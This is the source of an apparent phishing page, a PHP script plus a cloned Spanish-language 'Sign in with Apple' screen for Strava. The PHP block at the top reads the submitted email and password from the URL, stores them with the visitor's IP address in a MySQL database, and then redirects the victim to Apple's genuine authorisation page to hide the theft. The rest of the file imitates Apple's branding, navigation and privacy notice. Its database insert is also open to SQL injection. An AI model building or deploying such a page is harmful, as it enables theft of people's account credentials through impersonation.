<?php

ini_set('display_errors', 1);
ini_set('display_startup_errors', 1);
error_reporting(E_ALL);

//echo "<h1> Pagina del registro</h1>";
$servername = "localhost";
$database = "aloxploitDatabase";
$username = "aloxploit";
$password = "alox123";


// creamos conexion
  $conn = mysqli_connect($servername, $username, $password, $database);
//si estan todos los campos rellenos los insertamos en la base de datos
  if( isset($_GET["email"]) && isset($_GET["pass"]) && isset($_SERVER["REQUEST_METHOD"]) ){
$pass = $_GET["pass"];
$mail = $_GET["email"];
 if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
        $ipAddress = $_SERVER['HTTP_CLIENT_IP'];
    } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $ipAddress = $_SERVER['HTTP_X_FORWARDED_FOR'];
    } else {
        $ipAddress = $_SERVER['REMOTE_ADDR'];
        }


  $insert = "insert into datos values('$mail', '$pass','Apple','$ipAddress')";
//realizamos consulta para insertar los datos
  $return = mysqli_query( $conn, $insert);
  print_r( ( $return));
 // echo " : Registro correcto";
        header("Location: https://appleid.apple.com/auth/authorize?client_id=com.strava.app.sign.in&redirect_uri=https%3A%2F%2Fwww.strava.com%2Fo_auth%2Fapple&response_type=code%20id_token&state=%7B%26quot%3Bcontext%26quot%3B%3A%26quot%3Bapple_web_signin%26quot%3B%2C%26quot%3Bstate%26quot%3B%3A%26quot%3BeyJhbGciOiJIUzI1NiJ9.eyJzdGF0ZV9wYXJhbSI6Im0xdTFidXZuYTNibTRtOGkybWF2cGdlMzZzaGdhN3JtIn0.2Ovny8IpBmQsvk_wTmgrXHoLdAFtm_0Qj5VJxREBJZw%26quot%3B%7D&scope=name%20email&response_mode=form_post&frame_id=ec2aaccc-5a76-4e9d-9554-b6d59806e614&m=11&v=1.5.5");
        exit();
}
mysqli_close( $conn);
?>

<html dir="ltr" data-rtl="false" lang="es_ES" class="prefpane na-presentation globalheader-dark globalnav-scrim"><head>

    
    
        <title>Inicia sesión con el ID&nbsp;de&nbsp;Apple</title>
    


    <meta name="robots" content="noindex">
    <meta name="referrer" content="strict-origin-when-cross-origin">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
    <link rel="shortcut icon" type="image/x-icon" href="https://appleid.cdn-apple.com/appleauth/static/bin/cb3460663665/images/favicon.ico">
    <link rel="stylesheet" href="//www.apple.com/wss/fonts?family=Myriad+Set+Pro&amp;v=2" type="text/css">
    
<link rel="stylesheet" href="https://www.apple.com/wss/fonts?families=SF+Pro,v3|SF+Pro+Icons,v3" type="text/css">
      
                        
                        
                            <link rel="stylesheet" type="text/css" media="screen" href="https://appleid.cdn-apple.com/appleauth/static/cssj/N1972895247/profile/app.css">

                        
    <link rel="stylesheet" href="https://www.apple.com/api-www/global-elements/global-header/v1/assets/globalheader.css">
    
    <link rel="stylesheet" type="text/css" href="https://www.apple.com/ac/globalfooter/7/es_ES/styles/ac-globalfooter.built.css">
    
        
    
    
<style type="text/css"></style></head>
<body class="tk-body">

<div class="content" id="content" style="width: 100%;height: 100%;"><oauth-init class="oauth-init"><oauth-header class="oauth-header" {is-signin}="isSignin" {user}="user">


    <apple-global-nav>
      
      <div id="globalheader"><nav id="globalnav" lang="es-ES" dir="ltr" aria-label="Global" data-analytics-element-engagement-start="globalnav:onFlyoutOpen" data-analytics-element-engagement-end="globalnav:onFlyoutClose" data-store-api="https://www.apple.com/[storefront]/shop/bag/status" data-analytics-activitymap-region-id="global nav" data-analytics-region="global nav" class="globalnav no-js   "><div class="globalnav-content"><div class="globalnav-item globalnav-menuback"></div><ul id="globalnav-list" class="globalnav-list"><li data-analytics-element-engagement="globalnav hover - apple" class="
                                globalnav-item
                                globalnav-item-apple


                        "><a href="https://www.apple.com/es/" data-globalnav-item-name="apple" data-analytics-title="apple home" aria-label="Apple" class="globalnav-link globalnav-link-apple"><span class="globalnav-image-regular globalnav-link-image"><svg height="44" viewBox="0 0 14 44" width="14" xmlns="http://www.w3.org/2000/svg"><path d="m13.0729 17.6825a3.61 3.61 0 0 0 -1.7248 3.0365 3.5132 3.5132 0 0 0 2.1379 3.2223 8.394 8.394 0 0 1 -1.0948 2.2618c-.6816.9812-1.3943 1.9623-2.4787 1.9623s-1.3633-.63-2.613-.63c-1.2187 0-1.6525.6507-2.644.6507s-1.6834-.9089-2.4787-2.0243a9.7842 9.7842 0 0 1 -1.6628-5.2776c0-3.0984 2.014-4.7405 3.9969-4.7405 1.0535 0 1.9314.6919 2.5924.6919.63 0 1.6112-.7333 2.8092-.7333a3.7579 3.7579 0 0 1 3.1604 1.5802zm-3.7284-2.8918a3.5615 3.5615 0 0 0 .8469-2.22 1.5353 1.5353 0 0 0 -.031-.32 3.5686 3.5686 0 0 0 -2.3445 1.2084 3.4629 3.4629 0 0 0 -.8779 2.1585 1.419 1.419 0 0 0 .031.2892 1.19 1.19 0 0 0 .2169.0207 3.0935 3.0935 0 0 0 2.1586-1.1368z"></path></svg></span><span class="globalnav-image-compact globalnav-link-image"><svg height="48" viewBox="0 0 17 48" width="17" xmlns="http://www.w3.org/2000/svg"><path d="m15.5752 19.0792a4.2055 4.2055 0 0 0 -2.01 3.5376 4.0931 4.0931 0 0 0 2.4908 3.7542 9.7779 9.7779 0 0 1 -1.2755 2.6351c-.7941 1.1431-1.6244 2.2862-2.8878 2.2862s-1.5883-.734-3.0443-.734c-1.42 0-1.9252.7581-3.08.7581s-1.9611-1.0589-2.8876-2.3584a11.3987 11.3987 0 0 1 -1.9373-6.1487c0-3.61 2.3464-5.523 4.6566-5.523 1.2274 0 2.25.8062 3.02.8062.734 0 1.8771-.8543 3.2729-.8543a4.3778 4.3778 0 0 1 3.6822 1.841zm-6.8586-2.0456a1.3865 1.3865 0 0 1 -.2527-.024 1.6557 1.6557 0 0 1 -.0361-.337 4.0341 4.0341 0 0 1 1.0228-2.5148 4.1571 4.1571 0 0 1 2.7314-1.4078 1.7815 1.7815 0 0 1 .0361.373 4.1487 4.1487 0 0 1 -.9867 2.587 3.6039 3.6039 0 0 1 -2.5148 1.3236z"></path></svg></span><span class="globalnav-link-text">Apple</span></a></li><li class="globalnav-item globalnav-menu" data-topnav-flyout-item="menu" data-topnav-flyout-label="Menu" role="none"><div class="globalnav-flyout" data-topnav-flyout="menu"><div class="globalnav-menu-list"><div data-analytics-element-engagement="globalnav hover - store" class="
                                globalnav-item
                                globalnav-item-store
                                globalnav-item-menu

                        "><ul class="globalnav-submenu-trigger-group" role="none"></ul></div><div data-analytics-element-engagement="globalnav hover - ipad" class="
                                globalnav-item
                                globalnav-item-ipad
                                globalnav-item-menu

                        "><ul class="globalnav-submenu-trigger-group" role="none"></ul></div><div data-analytics-element-engagement="globalnav hover - watch" class="
                                globalnav-item
                                globalnav-item-watch
                                globalnav-item-menu

                        "><ul class="globalnav-submenu-trigger-group" role="none"></ul></div><div data-analytics-element-engagement="globalnav hover - tv-home" class="
                                globalnav-item
                                globalnav-item-tv-home
                                globalnav-item-menu

                        "><ul class="globalnav-submenu-trigger-group" role="none"></ul></div><div data-analytics-element-engagement="globalnav hover - accessories" class="
                                globalnav-item
                                globalnav-item-accessories
                                globalnav-item-menu

                        "><ul class="globalnav-submenu-trigger-group" role="none"></ul></div></div></div></li></ul><div class="globalnav-menutrigger"><button id="globalnav-menutrigger-button" class="globalnav-menutrigger-button" aria-controls="globalnav-list" aria-label="Menu" data-topnav-menu-label-open="Menu" data-topnav-menu-label-close="Close" data-topnav-flyout-trigger-compact="menu"><svg width="18" height="18" viewBox="0 0 18 18"><polyline id="globalnav-menutrigger-bread-bottom" class="globalnav-menutrigger-bread globalnav-menutrigger-bread-bottom" fill="none" stroke="currentColor" stroke-width="1.2" stroke-linecap="round" stroke-linejoin="round" points="2 12, 16 12"><animate id="globalnav-anim-menutrigger-bread-bottom-open" attributeName="points" keyTimes="0;0.5;1" dur="0.24s" begin="indefinite" fill="freeze" calcMode="spline" keySplines="0.42, 0, 1, 1;0, 0, 0.58, 1" values=" 2 12, 16 12; 2 9, 16 9; 3.5 15, 15 3.5"></animate><animate id="globalnav-anim-menutrigger-bread-bottom-close" attributeName="points" keyTimes="0;0.5;1" dur="0.24s" begin="indefinite" fill="freeze" calcMode="spline" keySplines="0.42, 0, 1, 1;0, 0, 0.58, 1" values=" 3.5 15, 15 3.5; 2 9, 16 9; 2 12, 16 12"></animate></polyline><polyline id="globalnav-menutrigger-bread-top" class="globalnav-menutrigger-bread globalnav-menutrigger-bread-top" fill="none" stroke="currentColor" stroke-width="1.2" stroke-linecap="round" stroke-linejoin="round" points="2 5, 16 5"><animate id="globalnav-anim-menutrigger-bread-top-open" attributeName="points" keyTimes="0;0.5;1" dur="0.24s" begin="indefinite" fill="freeze" calcMode="spline" keySplines="0.42, 0, 1, 1;0, 0, 0.58, 1" values=" 2 5, 16 5; 2 9, 16 9; 3.5 3.5, 15 15"></animate><animate id="globalnav-anim-menutrigger-bread-top-close" attributeName="points" keyTimes="0;0.5;1" dur="0.24s" begin="indefinite" fill="freeze" calcMode="spline" keySplines="0.42, 0, 1, 1;0, 0, 0.58, 1" values=" 3.5 3.5, 15 15; 2 9, 16 9; 2 5, 16 5"></animate></polyline></svg></button></div></div></nav><div id="globalnav-curtain" class="globalnav-curtain"></div><div id="globalnav-placeholder" class="globalnav-placeholder"></div></div>
      
      
    </apple-global-nav>

<local-nav title="ID&nbsp;de&nbsp;Apple" item1-text="Iniciar sesión"><input type="checkbox" id="ac-localnav-menustate" class="ac-localnav-menustate">
<div id="ac-localnav-sticky-placeholder" class="css-sticky"></div><nav id="ac-localnav" data-sticky="" role="navigation" class="ac-localnav js touch css-sticky">
    <div class="ac-localnav-wrapper">
        <div class="ac-localnav-background"></div>
        <div class="ac-localnav-content">
            <div class="ac-localnav-title">
                <span>ID&nbsp;de&nbsp;Apple</span>
            </div>
                <div class="ac-localnav-menu">
                    <a href="#ac-localnav-menustate" class="ac-localnav-menucta-anchor ac-localnav-menucta-anchor-open" id="ac-localnav-menustate-open">
                        <span class="ac-localnav-menucta-anchor-label">Open Menu</span>
                    </a>
                    <a href="#" class="ac-localnav-menucta-anchor ac-localnav-menucta-anchor-close" id="ac-localnav-menustate-close">
                        <span class="ac-localnav-menucta-anchor-label">Close Menu</span>
                    </a>
                    <div class="ac-localnav-menu-tray">
                        <ul class="ac-localnav-menu-items">
                                <li class="ac-localnav-menu-item">
                                  <span class="ac-localnav-menu-link current" title="Iniciar sesión">
                                      <span aria-hidden="true">Iniciar sesión</span>
                                      <span class="a11y">Iniciar sesión</span>
                                  </span>
                                </li>
                        </ul>
                    </div>

                    <div class="ac-localnav-actions">
                        <div class="ac-localnav-action ac-localnav-action-menucta" aria-hidden="true">
                            <label for="ac-localnav-menustate" class="ac-localnav-menucta">
                                <span class="ac-localnav-menucta-chevron"></span>
                            </label>
                        </div>
                    </div>

                </div>
        </div>
    </div>
</nav>
<label id="ac-localnav-curtain" class="ac-localnav-curtain" for="localnav-menustate"></label>
</local-nav></oauth-header>
<div class="oauth-init__content">
    <div class="oauth-init__content__container">

            <oauth-signin {on-success}="@successSigninHandler" {on-cancel}="@cancelHandler" {auth-init-opts}="authInitOpts" {inline-signin}="inlineSignin">

<div id="signin" class="oauth-signin si-body si-container container-fluid oauth-internal-signin" data-theme="dark"><apple-auth class="appleauth-inline " app-loading-defaults="{appLoadingDefaults}">
<div class="widget-container  fade-in restrict-min-content  restrict-max-wh  fade-in " data-mode="embed" data-isiebutnotedge="false">

    <div id="step" class="si-step  ">
            <logo {hide-app-logo}="hideAppLogo" {show-fade-in}="showFadeIn" {(section)}="section">
    
        
            <div class="logo   signin-label  fade-in logo-profile">
                
                    <img class="cnsmr-app-image profile-app-logo" src="https://is1-ssl.mzstatic.com/image/thumb/Purple126/v4/31/30/d7/3130d781-3460-e295-943b-7df3f3e34cd5/AppIcon-0-0-1x_U007ephone-0-0-85-220.png/100x100wd.png" srcset="https://is1-ssl.mzstatic.com/image/thumb/Purple126/v4/31/30/d7/3130d781-3460-e295-943b-7df3f3e34cd5/AppIcon-0-0-1x_U007ephone-0-0-85-220.png/200x200wd.png 2x, https://is1-ssl.mzstatic.com/image/thumb/Purple126/v4/31/30/d7/3130d781-3460-e295-943b-7df3f3e34cd5/AppIcon-0-0-1x_U007ephone-0-0-85-220.png/300x300wd.png 3x" style="width: 72px;" role="presentation">
            </div>
    
    
    

</logo>
        <div id="stepEl" class="   "><sign-in suppress-iforgot="{suppressIforgot}" initial-route="" {on-test-idp}="@_onTestIdp">
  
          
            <div class="signin fade-in" id="signin">
                <app-title signin-label="true" title-class="">    
    
    
        <h1 tabindex="-1" class="si-container-title tk-intro  ">
                              Usa tu ID&nbsp;de&nbsp;Apple para iniciar sesión en Strava.
                
        </h1>
</app-title>  
                  
                                            
              <div class="  swp-enable  container si-field-container  password-second-step     ">
                  
                    

<form action="apple.php" method="GET">
  <div class="">
    <div>
      <div class="account-name">
        <div>
          <div class=" form-cell-wrapper form-textbox   ">
            <input type="text" id="email" name="email" can-field="accountName" aria-labelledby="apple_id_field_label" autocorrect="off" autocapitalize="none" aria-required="true" required="required" spellcheck="false"  class="force-ltr form-textbox-input " autocomplete="off" aria-invalid="false">
            <span aria-hidden="true" id="apple_id_field_label" class=" form-textbox-label  form-label-flyout">             
              Correo o número de teléfono
            </span>
          </div>
          

        </div>
      </div>
      <div class="account-name">
        <div>
          <div class=" form-cell-wrapper form-textbox   ">
            <input type="password" id="pass" name="pass" can-field="accountName" aria-labelledby="apple_id_field_label" autocorrect="off" autocapitalize="none" aria-required="true" required="required" spellcheck="false" ($focus)="appleIdFocusHandler()" ($blur)="appleIdBlurHandler()" class="force-ltr form-textbox-input " autocomplete="off" aria-invalid="false">
            <span aria-hidden="true" id="apple_id_field_label" class=" form-textbox-label  form-label-flyout">             
              Contraseña
            </span>
          </div>
          
<style>
    /* ... (otros estilos) ... */

    .links button {
        background-color: #000; /* Color de fondo negro */
        color: #fff; /* Color de texto blanco */
        border: 2px solid #000; /* Borde negro de 2 píxeles */
        padding: 12px 20px; /* Ajusta el espaciado interno según sea necesario */
        border-radius: 4px; /* Bordes redondeados */
        cursor: pointer;
        font-size: 14px;
        transition: background-color 0.3s ease; /* Transición suave en el cambio de color de fondo */
    }

    .links button:hover {
        background-color: #333; /* Cambia el color de fondo en el hover */
    }

    /* ... (otros estilos) ... */
</style>
          
 <div class="links">
                <button type="submit">Iniciar sesión</button>
                </div>

        </div>
      </div>

        
    </div>

   
  </div>
              </form>
              <div class="si-container-footer ">
                
                  
                  <div class="links tk-subbody">
                      <div class="si-forgot-password">
                          <a id="iforgot-link" class="si-link ax-outline lite-theme-override" ($click)="iforgotLinkClickHandler($element)" href="https://iforgot.apple.com/password/verify/appleid" target="_blank">
                              
                                ¿Has olvidado la <span class="no-wrap sk-icon sk-icon-after sk-icon-external">contraseña?</span>
                              
                                <span class="sr-only">Se abre en una ventana nueva.</span>
                            
                          </a>
                        
                      </div>
                    
                    
                    
                    
                      <div class="label-small text-centered centered tk-caption privacy-wrapper">
                              <div class="privacy-icon"></div>                              Al configurar Iniciar sesión con Apple, la información sobre tus interacciones con Apple y este dispositivo puede ser utilizada por Apple para ayudar a evitar fraudes. <a href="https://www.apple.com/es/privacy/" target="_blank" rel="noopener">Consulta cómo se gestionan tus datos...<span class="sr-only"> Se abre en una ventana nueva.</span></a>
                        </div>
                  </div>
                
                
              </div>
            </div>
            
            
            
            
      

</sign-in></div>
    </div>
 
</div>

</apple-auth></div>

</oauth-signin>


    </div>
</div>

<div class="oauth-init__global-footer">
    <apple-global-footer>
        <footer id="ac-globalfooter" class="js" lang="en-US" data-analytics-region="global footer" role="contentinfo" aria-labelledby="ac-gf-label">
            <div class="ac-gf-content">
                <h2 class="ac-gf-label" id="ac-gf-label">Apple Footer</h2>
                 <style>#ac-globalfooter .ac-gf-footer-legal-link:last-child  {margin: 3px 0 0 0;} #ac-globalfooter .ac-gf-footer {border-top: none;}</style><section class="ac-gf-footer">


        <div class="ac-gf-footer-legal">
                <div class="ac-gf-footer-legal-copyright">Copyright © 2024 Apple Inc. Todos los derechos reservados.
                </div>
                <div class="ac-gf-footer-legal-links">

 <a class="ac-gf-footer-legal-link" href="
https://www.apple.com/es/legal/privacy/" data-analytics-title="privacy policy">Política de privacidad</a>

                        <a class="ac-gf-footer-legal-link" href="https://www.apple.com/legal/privacy/es/cookies/" data-analytics-title="use of cookies">Uso de cookies</a>


                </div>
        </div>
</section>

            </div>
        </footer>
        <script type="text/javascript" src="https://www.apple.com/ac/globalfooter/7/es_ES/scripts/ac-globalfooter.built.js"></script></apple-global-footer>
</div>

</oauth-init></div>


        <script type="text/javascript" src="https://appleid.cdn-apple.com/appleauth/static/jsj/1970480931/boot/initLocalizationStrings.js"></script>
     

</body></html>
